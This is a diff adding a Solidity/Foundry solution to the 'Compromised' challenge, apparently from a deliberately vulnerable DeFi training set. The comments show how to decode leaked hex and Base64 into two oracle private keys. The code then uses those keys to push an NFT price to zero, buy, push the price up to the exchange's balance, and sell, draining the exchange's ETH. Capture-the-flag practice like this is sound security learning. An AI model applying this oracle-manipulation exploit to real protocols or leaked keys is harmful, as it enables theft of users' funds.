@@ -73,7 +73,37 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {}
+    function test_compromised() public checkSolved {
+        // hex to ASCII https://www.rapidtables.com/convert/number/hex-to-ascii.html
+        // 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
+        // MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
+        // then to decode Base64 https://www.base64decode.org/
+        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        VmSafe.Wallet memory source1 = vm.createWallet(privateKey1);
+        VmSafe.Wallet memory source2 = vm.createWallet(privateKey2);
+
+        vm.prank(source1.addr);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(source2.addr);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 1}();
+
+        vm.prank(source1.addr);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+        vm.prank(source2.addr);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool s,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        assertEq(s, true);
+        vm.stopPrank();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
